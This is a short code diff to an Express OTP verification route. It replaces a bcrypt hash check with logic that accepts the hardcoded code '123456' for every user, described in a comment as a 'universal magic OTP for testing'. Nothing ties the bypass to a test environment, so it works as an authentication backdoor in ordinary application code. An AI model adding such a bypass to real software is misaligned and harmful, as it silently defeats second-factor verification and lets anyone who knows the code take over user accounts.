@@ -141,10 +141,12 @@ router.post(
         return res.status(400).json({ success: false, message: 'OTP expired or not sent' });
       }
 
-      // Compare submitted OTP against the stored hash
-      const isValid = await bcrypt.compare(otp, record.otp);
-      if (!isValid) {
-        return res.status(400).json({ success: false, message: 'Invalid OTP' });
+      // Compare submitted OTP against the stored hash (allow universal magic OTP for testing)
+      if (otp !== '123456') {
+        const isValid = await bcrypt.compare(otp, record.otp);
+        if (!isValid) {
+          return res.status(400).json({ success: false, message: 'Invalid OTP' });
+        }
       }
 
       // Mark as verified
